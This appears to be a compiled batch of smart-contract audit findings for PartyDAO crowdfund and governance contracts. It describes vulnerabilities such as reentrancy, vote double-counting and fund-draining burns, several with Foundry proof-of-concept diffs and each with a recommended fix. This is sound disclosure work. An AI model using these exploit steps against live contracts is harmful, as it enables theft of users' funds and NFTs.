and malicious struct.    ### CPU  * In the `DistributionInfo` we have 224 bytes (and for `FixedGovernanceOpts` 192 bytes if we precalculate the hosts hash) * A computer needs about 11 cycles per byte * An avg home PC can do ~3e9 cycles per seconds * There are ~8.6e4 seconds a day * Putting it all together `1.4e18 * 11 * 224 / (3e9*8.6e4)` = ~1.3e8  * Note that we can further optimize it (by 10 times at least), since we're using the same input and only modifying the last bits every time (the `fee` field)  ### Storage 32 * 1.4e18 = ~4.5e19 bytes is needed, while an affordable drive can be 8TB=~8e12 bytes. That puts it about 5e6 times away from and affordable attack.   ### Overall Risk The calculations above are for basic equipment, an attacker can be spending more on equipment to get closer (I'd say you can easily multiply that by 100 for a medium size attacker + running the computations for more than one day) Combining that with the fact that a non-standard hash is used, and that in general hashes can have small vulnerabilities that lower a bit their strength - I'd argue it's not very safe to be ~1e4 (for a medium size attacker; ~1.5e5 for 16 bytes) away from a practical attack.    ## Recommended Mitigation Steps Use the standard, 32-bytes, output of `keccak256()`
# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/AuctionCrowdfund.sol#L166-L167   # Vulnerability details  ## Description AuctionCrowdfund's bid() allows any user to compete on an auction on the party's behalf. The code in bid()  forbids placing a bid if party is already winning the auction: ``` if (market.getCurrentHighestBidder(auctionId_) == address(this)) {             revert AlreadyHighestBidderError();         } ``` However, it does not account for attackers placing bids from their own wallet, and then immediately overbidding them using the party's funds. This can be used in two ways: 1. Attacker which lists an NFT, can force the party to spend all its funds up to maxBid on the auction, even if the party could have purchased the NFT for much less. 2. Attackers can grief random auctions, making them pay the absolute maximum for the item. Attackers can use this to drive the prices of NFT items up, profiting from this using secondary markets.  ## Impact Parties can be stopped from buying items at a good value without any risk to the attacker.  ## Proof of Concept 1. Attacker places an NFT for sale, valued at X 2. Attacker creates an AuctionCrowdfund, with maxBid = Y such that Y = 2X 3. Current bid for the NFT is X - AUCTION_STEP 3. Users contribute to the fund, which now has 1.5X 4. Users call bid() to bid X  for the NFT 5. Attacker bids for the item externally for 1.5X - AUCTION_STEP 6. Attacker calls bid() to bid 1.5X for the NFT 7. Attacker sells his NFT for 1.5X although no one apart from the party was interested in buying it above price X  ## Tools Used Manual audit.  ## Recommended Mitigation Steps Introduce a new option variable to AuctionCrowdfunds called speedBump. Inside the bid() function, calculate seconds since last bid, multiplied by the price change factor. This product must be smaller than the chosen speedBump. Using this scheme, the protocol would have resistance to sudden bid spikes. Optionally, allow a majority funder to override the speed bump.  
# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/utils/LibAddress.sol#L8-L15 https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/crowdfund/Crowdfund.sol#L444-L489 https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/distribution/TokenDistributor.sol#L371-L388   # Vulnerability details  ## Impact The following `transferEth` function is called when calling the `_burn` or `_transfer` function below. If the `receiver` input for the `transferEth` function corresponds to a contract, it is possible that the receiver contract does not, intentionally or unintentionally, implement the `receive` or `fallback` function in a way that supports receiving ETH or that calling the receiver contract's `receive` or `fallback` function executes complicated logics that cost much gas, which could cause calling `transferEth` to revert. For example, when calling `transferEth` reverts, calling `_burn` also reverts; this means that the receiver contract would not be able to get the voting power and receive the extra contribution it made after the crowdfunding finishes; yet, the receiver contract deserves these voting power and contribution refund. Hence, the receiver contract loses valuables that it deserves, which is unfair to the users who controls it.  https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/utils/LibAddress.sol#L8-L15 ```solidity     function transferEth(address payable receiver, uint256 amount)         internal     {         (bool s, bytes memory r) = receiver.call{value: amount}("");         if (!s) {             revert EthTransferFailed(receiver, r);         }     } ```  https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/crowdfund/Crowdfund.sol#L444-L489 ```solidity     function _burn(address payable contributor, CrowdfundLifecycle lc, Party party_)         private     {         // If the CF has won, a party must have been created prior.         if (lc == CrowdfundLifecycle.Won) {             if (party_ == Party(payable(0))) {                 revert NoPartyError();             }         } else if (lc != CrowdfundLifecycle.Lost) {             // Otherwise it must have lost.             revert WrongLifecycleError(lc);         }         // Split recipient can burn even if they don't have a token.         if (contributor == splitRecipient) {             if (_splitRecipientHasBurned) {                 revert SplitRecipientAlreadyBurnedError();             }             _splitRecipientHasBurned = true;         }         // Revert if already burned or does not exist.         if (splitRecipient != contributor || _doesTokenExistFor(contributor)) {             CrowdfundNFT._burn(contributor);         }         // Compute the contributions used and owed to the contributor, along         // with the voting power they'll have in the governance stage.         (uint256 ethUsed, uint256 ethOwed, uint256 votingPower) =             _getFinalContribution(contributor);         if (votingPower > 0) {             // Get the address to delegate voting power to. If null, delegate to self.             address delegate = delegationsByContributor[contributor];             if (delegate == address(0)) {                 // Delegate can be unset for the split recipient if they never                 // contribute. Self-delegate if this occurs.                 delegate = contributor;             }             // Mint governance NFT for the contributor.             party_.mint(                 contributor,                 votingPower,                 delegate             );         }         // Refund any ETH owed back to the contributor.         contributor.transferEth(ethOwed);         emit Burned(contributor, ethUsed, ethOwed, votingPower);     } ```  https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/distribution/TokenDistributor.sol#L371-L388 ```solidity     function _transfer(         TokenType tokenType,         address token,         address payable recipient,         uint256 amount     )         private     {         bytes32 balanceId = _getBalanceId(tokenType, token);         // Reduce stored token balance.         _storedBalances[balanceId] -= amount;         if (tokenType == TokenType.Native) {             recipient.transferEth(amount);         } else {             assert(tokenType == TokenType.Erc20);             IERC20(token).compatTransfer(recipient, amount);         }     } ```  ## Proof of Concept Please add the following `error` and append the test in `sol-tests\crowdfund\BuyCrowdfund.t.sol`. This test will pass to demonstrate the described scenario.  ```solidity     error EthTransferFailed(address receiver, bytes errData);      function testContributorContractFailsToReceiveETH() public {         uint256 tokenId = erc721Vault.mint();         BuyCrowdfund pb = _createCrowdfund(tokenId, 0);          // This contract is used to simulate a contract that does not implement the receive or fallback function for the purpose of receiving ETH.         address payable contributorContract = payable(address(this));         vm.deal(contributorContract, 1e18);          address delegate = _randomAddress();          // contributorContract contributes 1e18.         vm.prank(contributorContract);         pb.contribute{ value: 1e18 }(delegate, "");          // The price of the NFT of interest is 0.5e18.         Party party_ = pb.buy(             payable(address(erc721Vault)),             0.5e18,             abi.encodeCall(erc721Vault.claim, (tokenId)),             defaultGovernanceOpts         );          // After calling the buy function, the party is created with the NFT.         assertEq(address(party), address(party_));         assertTrue(pb.getCrowdfundLifecycle() == Crowdfund.CrowdfundLifecycle.Won);         assertEq(pb.settledPrice(), 0.5e18);         assertEq(pb.totalContributions(), 1e18);         assertEq(address(pb).balance, 1e18 - 0.5e18);          // Calling the burn function reverts because contributorContract cannot receive ETH through the receive or fallback function         vm.expectRevert(abi.encodeWithSelector(             EthTransferFailed.selector,             contributorContract,             ""         ));         pb.burn(contributorContract);          // contributorContract does not receive 0.5e18 back from the BuyCrowdfund contract.         assertEq(contributorContract.balance, 0);     } ```  ## Tools Used VSCode  ## Recommended Mitigation Steps When calling the `transferEth` function, if the receiver contract is unable to receive ETH through its `receive` or `fallback` function, WETH can be used to deposit the corresponding ETH amount, and the deposited amount can be transferred to the receiver contract.
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-09-party-findings/blob/main/data/0x1f8b-Q.md).
# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/BuyCrowdfundBase.sol#L122   # Vulnerability details  ## Impact  BuyCrowdfundBase.sol _buy() When callValue = 0 is settledPrice to totalContributions ignoring whether totalContributions > maximumPrice resulting in the minimum proportion of participants expected to become smaller  ## Proof of Concept ```     function _buy(         IERC721 token,         uint256 tokenId,         address payable callTarget,         uint96 callValue,         bytes calldata callData,         FixedGovernanceOpts memory governanceOpts     )     ...             settledPrice_ = callValue == 0 ? totalContributions : callValue;  //**** not check totalContributions>maximumPrice****//             if (settledPrice_ == 0) {                 // Still zero, which means no contributions.                 revert NoContributionsError();             }             settledPrice = settledPrice_;     ```  (AuctionCrowdfund.sol finalize()  similar)  ## Recommended Mitigation Steps add check  ```     function _buy(         IERC721 token,         uint256 tokenId,         address payable callTarget,         uint96 callValue,         bytes calldata callData,         FixedGovernanceOpts memory governanceOpts     )     ...             settledPrice_ = callValue == 0 ? totalContributions : callValue;             if (settledPrice_ == 0) {                 // Still zero, which means no contributions.                 revert NoContributionsError();             }  +++         if (maximumPrice_ != 0 && settledPrice_ > maximumPrice_) { +++                settledPrice_ = maximumPrice_; +++         }              settledPrice = settledPrice_;     ``` 
# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/crowdfund/AuctionCrowdfund.sol#L236   # Vulnerability details  ## Impact Consider a scenario where few users contributed in auction but noone has placed any bid due to reason like NFT price crash etc. So there was 0 bid, nft owner could seize the crowdfund users fund until they pay a ransom amount as shown below.  ## Proof of Concept 1. NFT N auction is going on 2. CrowdFund users have contributed 100 amount for this auction 3. Bidding has not been done yet 4. A news came for this NFT owner which leads to crashing of this NFT price 5. CrowdFund users are happy that they have not bided and are just waiting for auction to complete so that they can get there refund 6. NFT owner realizing this blackmails the CrowdFund users to send him amount 50 or else he would send this worthless NFT to the Crowdfund Auction contract basically stucking all crowdfund users fund. CrowdFund users ignore this and simply wait for auction to end 7. Once auction completes [finalize function](https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/crowdfund/AuctionCrowdfund.sol#L196) is called  ``` function finalize(FixedGovernanceOpts memory governanceOpts)         external         onlyDelegateCall         returns (Party party_)     { ...  if (nftContract.safeOwnerOf(nftTokenId) == address(this)) {             if (lastBid_ == 0) {                 // The NFT was gifted to us. Everyone who contributed wins.                 lastBid_ = totalContributions;                 if (lastBid_ == 0) {                     // Nobody ever contributed. The NFT is effectively burned.                     revert NoContributionsError();                 }                 lastBid = lastBid_;             }             // Create a governance party around the NFT.             party_ = _createParty(                 _getPartyFactory(),                 governanceOpts,                 nftContract,                 nftTokenId             );             emit Won(lastBid_, party_);         }  ... } ```  8. Before calling finalize the lastBid was 0 since no one has bid on this auction but lets see what happens on calling finalize  9. Since NFT owner has transferred NFT to this contract so below statement holds true and lastBid_ is also 0 since no one has bided  ``` if (lastBid_ == 0) {                 lastBid_ = totalContributions; ```  10. This means now lastBid_ is changed to totalContributions which is 100 so crowdfund users funds will not be refunded and they will end up with non needed NFT.   ## Recommended Mitigation Steps Remove the line lastBid_ = totalContributions; and let it be the last bid amount which crowdfund users actually bided with.
# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/BuyCrowdfund.sol#L98-L116   # Vulnerability details  ## Impact  Party is DOS'd and may potentially lose access to NFT  ## Proof of Concept  [Crowdfund.sol#L280-L298](https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/Crowdfund.sol#L280-L298)      party = party_ = partyFactory         .createParty(             address(this),             Party.PartyOptions({                 name: name,                 symbol: symbol,                 governance: PartyGovernance.GovernanceOpts({                     hosts: governanceOpts.hosts,                     voteDuration: governanceOpts.voteDuration,                     executionDelay: governanceOpts.executionDelay,                     passThresholdBps: governanceOpts.passThresholdBps,                     totalVotingPower: _getFinalPrice().safeCastUint256ToUint96(),                     feeBps: governanceOpts.feeBps,                     feeRecipient: governanceOpts.feeRecipient                 })             }),             preciousTokens,             preciousTokenIds         );  [BuyCrowdfundBase.sol#L166-L173](https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/BuyCrowdfundBase.sol#L166-L173)      function _getFinalPrice()         internal         override         view         returns (uint256)     {         return settledPrice;     }  When BuyCrowdFund.sol successfully completes a buy, totalVotingPower is set to _getFinalPrice which in the case of BuyCrowdFundBase.sol returns the price at which the NFT was purchased. totalVotingPower is used by the governance contract to determine the number of votes needed for a proposal to pass. If there are not enough claimable votes to meet that threshold then the party is softlocked because it can't pass any proposals. An attacker could exploit this to DOS even a private party with the following steps:  1. Wait for party to be filled to just under quorum threshold 2. Donate ETH to the crowdfund contract 3. Call BuyCrowdFund.sol#buy. Since it is unpermissioned even for parties with a gatekeeper, the call won't revert  Since the voting power for the final amount of ETH cannot be claimed, the party is now softlocked. If emergencyExecuteDisabled is true then the party will be permanantly locked and the NFT would effectively be burned. If emergencyExecuteDisabled is false then users would have to wait for PartyDAO to reclaim the NFT.  ## Tools Used  ## Recommended Mitigation Steps  Permission to call BuyCrowdFund.sol#buy should be gated if there is a gatekeeper
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-09-party-findings/blob/main/data/Jeiwan-Q.md).
# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/proposals/ArbitraryCallsProposal.sol#L72   # Vulnerability details  ## Impact The ArbitraryCallsProposal contract requires sender to provide eth(msg.value) for each call. Now if user has provided more eth than combined call.value then this excess eth is not refunded back to user  ## Proof of Concept  1. Observe the [_executeArbitraryCalls function](https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/proposals/ArbitraryCallsProposal.sol#L37)  ``` function _executeArbitraryCalls(         IProposalExecutionEngine.ExecuteProposalParams memory params     )         internal         returns (bytes memory nextProgressData)     {  ... uint256 ethAvailable = msg.value;         for (uint256 i = 0; i < calls.length; ++i) {             // Execute an arbitrary call.             _executeSingleArbitraryCall(                 i,                 calls[i],                 params.preciousTokens,                 params.preciousTokenIds,                 isUnanimous,                 ethAvailable             );             // Update the amount of ETH available for the subsequent calls.             ethAvailable -= calls[i].value;             emit ArbitraryCallExecuted(params.proposalId, i, calls.length);         } .... } ```  2. As we can see user provided msg.value is deducted with each calls[i].value 3. Assume user provided 5 amount as msg.value and made a single call with calls[0].value as 4 4. This means after calls have been completed ethAvailable will become 5-4=1 5. Ideally this 1 eth should be refunded back to user but there is no provision for same and the fund will remain in contract   ## Recommended Mitigation Steps At the end of _executeArbitraryCalls function, refund the remaining ethAvailable back to the user
# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/crowdfund/AuctionCrowdfund.sol#L149   # Vulnerability details  ## Impact AuctionCrowdfund contract is designed in a way to allow bidding max upto maximumBid. But due to a flaw, anyone (including NFT seller) can make sure that CrowdFund bid always remain equal to maximumBid thus removing the purpose of maximumBid. This also causes loss to Party participating in this Auction as the auction will always end up with maximumBid even when it could have stopped with lower bid as shown in POC  ## Proof of Concept 1. An auction is started for NFT N in the market 2. Party Users P1 starts an AuctionCrowdfund with maximumBid as 100 for this auction.  ``` function initialize(AuctionCrowdfundOptions memory opts)         external         payable         onlyConstructor     { ... maximumBid = opts.maximumBid; ... } ```  3. P1 bids amount 10 for the NFT N using [bid function](https://github.com/PartyDAO/party-contracts-c4/blob/main/contracts/crowdfund/AuctionCrowdfund.sol#L149) 4. Some bad news arrives for the NFT collection including NFT N reducing its price 5. P1 decides not to bid more than amount 10 due to this news 6. NFT collection owner who is watching this AuctionCrowdfund observes that bidding is only 10 but Party users have maximumBid of 100 7. NFT collection owner  asks his friend to bid on this NFT in the auction market (different from crowd fund) 8. NFT collection owner now takes advantage of same and himself calls the bid function of AuctionCrowdfund via Proxy  ``` function bid() external onlyDelegateCall { ... } ```  9. Now since last bid belongs to collection owner friend, so AuctionCrowdfund contract simply extends its bid further   ``` if (market.getCurrentHighestBidder(auctionId_) == address(this)) {             revert AlreadyHighestBidderError();         }         // Get the minimum necessary bid to be the highest bidder.         uint96 bidAmount = market.getMinimumBid(auctionId_).safeCastUint256ToUint96();         // Make sure the bid is less than the maximum bid.         if (bidAmount > maximumBid) {             revert ExceedsMaximumBidError(bidAmount, maximumBid);         }         lastBid = bidAmount; ```  10. NFT collection owner keeps repeating step 7-9 until AuctionCrowdfund reaches the final maximum bid of 100 11. After auction completes, collection owner gets 100 amount instead of 10 even though crowd fund users never bidded for amount 100  ## Recommended Mitigation Steps maximumbid concept can easily be bypassed as shown above and will not make sense. Either remove it completely    OR bid function should only be callable via crowdfund members then attacker would be afraid if new bid will come or not and there should be a consensus between crowdfund members before bidding which will protect this scenario
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-09-party-findings/blob/main/data/fatherOfBlocks-Q.md).
# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/proposals/ProposalExecutionEngine.sol#L183-L202   # Vulnerability details  Note: PartyDAO acknowledges that "canceling an InProgress proposal (mid-step) can leave the governance party in a vulnerable or undesirable state because there is no cleanup logic run during a cancel" in the "Known Issues / Topics" section of the contest readme. I still believe that this vulnerability needs to be mitigated as it can directly lead to loss of user funds.  ## Impact  Majority vote can abuse cancel functionality to steal an NFT owned by the party  ## Proof of Concept  ArbitraryCallsProposal.sol implements the following safeguards for arbitrary proposals that are not unanimous:  1. Prevents the ownership of any NFT changing during the call. It does this by checking the the ownership of all NFTs before and after the call.  2. Prevents calls that would change the approval status of any NFT. This is done by disallowing the "approve" and "setApprovalForAll" function selectors.  Additionally ListOnOpenseaProposal.sol implements the following safeguards:  1. NFTs are first listed for auction on Zora so that if they are listed for a very low price then the auction will keep them from being purchased at such a low price  2. At the end of the auction the approval is revoked when _cleanUpListing is called  These safeguards are ultimately ineffective though. The majority could use the following steps to steal the NFT:  1. Create ListOnOpenseaProposal with high sell price and short cancel delay  2. Vote to approve proposal with majority vote  3. Execute first step of proposal, listing NFT on Zora auction for high price  4. Wait for Zora auction to end since the auction price is so high that no one will buy it  5. Execute next step, listing the NFT on Opensea. During this step the contract grants approval of the NFT to the Opensea contract  6. Wait for cancelDelay to expire  7. Call PartyGovernance.sol#cancel. This will immediately terminate the Opensea bypassing _cleanUpListing and keeping the approval to the Opensea contract  8. Create ArbitraryCallsProposal.sol that lists the NFT on Opensea for virtually nothing. Since only approval selectors have been blacklisted and the NFT does not change ownership, the proposal does not need to be unanimous to execute.  9. Approve proposal and execute  10. Buy NFT  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  When a proposal is canceled, it should call a proposal specific function that makes sure everything is cleaned up. NFTs delisted, approvals revoked, etc.
# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/AuctionCrowdfund.sol#L233-L242   # Vulnerability details  ## Impact In the finalize function of the AuctionCrowdfund contract, when the contract gets NFT and lastBid_ == 0, it is considered that NFT is gifted to the contract and everyone who contributed wins. ```         if (nftContract.safeOwnerOf(nftTokenId) == address(this)) {             if (lastBid_ == 0) {                 // The NFT was gifted to us. Everyone who contributed wins.                 lastBid_ = totalContributions; ``` But if the contract was bid before the NFT was gifted to the contract, then since lastBid_ ! = 0, only the user who contributed at the beginning will win. ## Proof of Concept https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/AuctionCrowdfund.sol#L233-L242 https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/AuctionCrowdfund.sol#L149-L175 ## Tools Used None ## Recommended Mitigation Steps Whether or not NFT is free to get should be determined using whether the contract balance is greater than totalContributions
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-09-party-findings/blob/main/data/R2-Q.md).
# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/distribution/TokenDistributor.sol#L131 https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/distribution/TokenDistributor.sol#L386   # Vulnerability details  ## Impact `TokenDistributor.createERC20Distribution` can be used to create token distributions for ERC777 tokens (which are backwards-compatible with ERC20). However, this introduces a reentrancy vulnerability which allows a party to get the tokens of another party. The problem is the `tokensToSend` hook which is executed BEFORE balance updates happens (see https://eips.ethereum.org/EIPS/eip-777). When this hook is executed, `token.balanceOf(address(this))` therefore still returns the old value, but `_storedBalances[balanceID]` was already decreased.  ## Proof Of Concept Party A and Party B have a balance of 1,000,000 tokens (of some arbitrary ERC777 token) in the distributor. Let's say for the sake of simplicity that both parties only have one user (user A in party A, user B in party B). User A (or rather his smart contract) performs the following attack: - He calls `claim`, which transfers 1,000,000 tokens to his contract address. In `_transfer`, `_storedBalances[balanceId]` is decreased by 1,000,000 and therefore now has a value of 1,000,000. - In the `tokensToSend` hook, he initiates another distribution for his party A by calling `PartyGovernance.distribute` which calls `TokenDistributor.createERC20Distribution` (we assume for the sake of simplicity that the party does not have more of these tokens, so the call transfers 0 tokens to the distributor). `TokenDistributor.createERC20Distribution` passes `token.balanceOf(address(this))` to `_createDistribution`. Note that this is still 2,000,000 because we are in the `tokensToSend` hook. - The supply of this distribution is calculated as `(args.currentTokenBalance - _storedBalances[balanceId]) = 2,000,000 - 1,000,000 = 1,000,000`. - When the `tokensToSend` hook is exited (and the first transfer has finished), he can retrieve the tokens of the second distribution (that was created in the hook) to steal the 1,000,000 tokens of party B.  ## Recommended Mitigation Steps Do not allow reentrancy in these functions.
# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/party/PartyGovernance.sol#L594   # Vulnerability details  ## Impact `PartyGovernanceNFT` uses the voting power at the time of proposal when calling `accept`. The problem with that is that a user can vote, transfer the NFT (and the voting power) to a different wallet, and then vote from this second wallet again during the same block that the proposal was created.  This can also be repeated multiple times to get an arbitrarily high voting power and pass every proposal unanimously.   The consequences of this are very severe. Any user (no matter how small his voting power is) can propose and pass arbitrary proposals animously and therefore steal all assets (including the precious tokens) out of the party.  ## Proof Of Concept This diff shows how a user with a voting power of 50/100 gets a voting power of 100/100 by transferring the NFT to a second wallet that he owns and voting from that one: ```diff --- a/sol-tests/party/PartyGovernanceUnit.t.sol +++ b/sol-tests/party/PartyGovernanceUnit.t.sol @@ -762,6 +762,7 @@ contract PartyGovernanceUnitTest is Test, TestUtils {          TestablePartyGovernance gov =              _createGovernance(100e18, preciousTokens, preciousTokenIds);          address undelegatedVoter = _randomAddress(); +        address recipient = _randomAddress();          // undelegatedVoter has 50/100 intrinsic VP (delegated to no one/self)          gov.rawAdjustVotingPower(undelegatedVoter, 50e18, address(0));   @@ -772,38 +773,13 @@ contract PartyGovernanceUnitTest is Test, TestUtils {          // Undelegated voter submits proposal.          vm.prank(undelegatedVoter);          assertEq(gov.propose(proposal, 0), proposalId); - -        // Try to execute proposal (fail). -        vm.expectRevert(abi.encodeWithSelector( -            PartyGovernance.BadProposalStatusError.selector, -            PartyGovernance.ProposalStatus.Voting -        )); -        vm.prank(undelegatedVoter); -        gov.execute( -            proposalId, -            proposal, -            preciousTokens, -            preciousTokenIds, -            "", -            "" -        ); - -        // Skip past execution delay. -        skip(defaultGovernanceOpts.executionDelay); -        // Try again (fail). -        vm.expectRevert(abi.encodeWithSelector( -            PartyGovernance.BadProposalStatusError.selector, -            PartyGovernance.ProposalStatus.Voting -        )); -        vm.prank(undelegatedVoter); -        gov.execute( -            proposalId, -            proposal, -            preciousTokens, -            preciousTokenIds, -            "", -            "" -        ); +        (, PartyGovernance.ProposalStateValues memory valuesPrev) = gov.getProposalStateInfo(proposalId); +        assertEq(valuesPrev.votes, 50e18); +        gov.transferVotingPower(undelegatedVoter, recipient, 50e18); //Simulate NFT transfer +        vm.prank(recipient); +        gov.accept(proposalId, 0); +        (, PartyGovernance.ProposalStateValues memory valuesAfter) = gov.getProposalStateInfo(proposalId); +        assertEq(valuesAfter.votes, 100e18);      } ```  ## Recommended Mitigation Steps You should query the voting power at `values.proposedTime - 1`. This value is already finalized when the proposal is created and therefore cannot be manipulated by repeatedly transferring the voting power to different wallets.
# Lines of code  https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/Crowdfund.sol#L147   # Vulnerability details  ## Impact If `opts.initialContributor` is set to `address(0)` (and `opts.initialDelegate` is not), there are two problems: 1.) If the crowdfund succeeds, the initial balance will be lost. It is still accredited to `address(0)`, but it is not retrievable.  2.) If the crowdfund does not succeed, anyone can completely drain the contract by repeatedly calling `burn` with `address(0)`. This will always succeed because `CrowdfundNFT._burn` can be called multiple times for `address(0)`. Every call will cause the initial balance to be burned (transferred to `address(0)`).  Issue 1 is somewhat problematic, but issue 2 is very problematic, because all funds of a crowdfund are burned and an attacker can specifically set up such a deployment (and the user would not notice anything special, after all these are parameters that the protocol accepts).  ## Proof Of Concept This diff illustrates scenario 2, i.e. where a malicious deployer burns all contributions (1 ETH) of `contributor`. He loses 0.25ETH for the attack, but this could be reduced significantly (with more `burn(payable(address(0)))` calls:  ```diff --- a/sol-tests/crowdfund/BuyCrowdfund.t.sol +++ b/sol-tests/crowdfund/BuyCrowdfund.t.sol @@ -36,9 +36,9 @@ contract BuyCrowdfundTest is Test, TestUtils {      string defaultSymbol = 'PBID';      uint40 defaultDuration = 60 * 60;      uint96 defaultMaxPrice = 10e18; -    address payable defaultSplitRecipient = payable(0); +    address payable defaultSplitRecipient = payable(address(this));      uint16 defaultSplitBps = 0.1e4; -    address defaultInitialDelegate; +    address defaultInitialDelegate = address(this);      IGateKeeper defaultGateKeeper;      bytes12 defaultGateKeeperId;      Crowdfund.FixedGovernanceOpts defaultGovernanceOpts; @@ -78,7 +78,7 @@ contract BuyCrowdfundTest is Test, TestUtils {                      maximumPrice: defaultMaxPrice,                      splitRecipient: defaultSplitRecipient,                      splitBps: defaultSplitBps, -                    initialContributor: address(this), +                    initialContributor: address(0),                      initialDelegate: defaultInitialDelegate,                      gateKeeper: defaultGateKeeper,                      gateKeeperId: defaultGateKeeperId, @@ -111,40 +111,26 @@ contract BuyCrowdfundTest is Test, TestUtils {      function testHappyPath() public {          uint256 tokenId = erc721Vault.mint();          // Create a BuyCrowdfund instance. -        BuyCrowdfund pb = _createCrowdfund(tokenId, 0); +        BuyCrowdfund pb = _createCrowdfund(tokenId, 0.25e18);          // Contribute and delegate.          address payable contributor = _randomAddress();          address delegate = _randomAddress();          vm.deal(contributor, 1e18);          vm.prank(contributor);          pb.contribute{ value: contributor.balance }(delegate, ""); -        // Buy the token. -        vm.expectEmit(false, false, false, true); -        emit MockPartyFactoryCreateParty( -            address(pb), -            address(pb), -            _createExpectedPartyOptions(0.5e18), -            _toERC721Array(erc721Vault.token()), -            _toUint256Array(tokenId) -        ); -        Party party_ = pb.buy( -            payable(address(erc721Vault)), -            0.5e18, -            abi.encodeCall(erc721Vault.claim, (tokenId)), -            defaultGovernanceOpts -        ); -        assertEq(address(party), address(party_)); -        // Burn contributor's NFT, mock minting governance tokens and returning -        // unused contribution. -        vm.expectEmit(false, false, false, true); -        emit MockMint( -            address(pb), -            contributor, -            0.5e18, -            delegate -        ); -        pb.burn(contributor); -        assertEq(contributor.balance, 0.5e18); +        vm.warp(block.timestamp + defaultDuration + 1); +        // The auction was not won, we can now burn all ETH from contributor... +        assertEq(address(pb).balance, 1.25e18); +        pb.burn(payable(address(0))); +        assertEq(address(pb).balance, 1e18); +        pb.burn(payable(address(0))); +        assertEq(address(pb).balance, 0.75e18); +        pb.burn(payable(address(0))); +        assertEq(address(pb).balance, 0.5e18); +        pb.burn(payable(address(0))); +        assertEq(address(pb).balance, 0.25e18); +        pb.burn(payable(address(0))); +        assertEq(address(pb).balance, 0); ```  ## Recommended Mitigation Steps Do not allow an initial contribution when `opts.initialContributor` is not set.
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-09-party-findings/blob/main/data/Lambda-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-09-party-findings/blob/main/data/Lambda-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-09-party-findings/blob/main/data/bulej93-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-09-party-findings/blob/main/data/rvierdiiev-Q.md).
